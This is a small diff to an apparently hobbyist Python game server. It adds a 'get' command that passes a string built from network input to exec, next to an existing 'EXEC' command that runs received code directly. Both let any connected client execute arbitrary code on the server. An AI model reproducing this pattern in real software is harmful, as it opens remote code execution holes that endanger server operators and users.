@@ -38,6 +38,11 @@ class Client(threading.Thread):
 						jeu.add_player(self.ide, str(a[1]))
 					elif a[0] == "lancer":
 						jeu.lancer_game()
+					elif a[0] == "get":
+						print("ho")
+						exec("self.send(" + str(a[1]+")"))
+						print("hey")
+						self.send(temp)
 					elif a[0] == "EXEC":
 						exec(str(a[1]))
 					else:
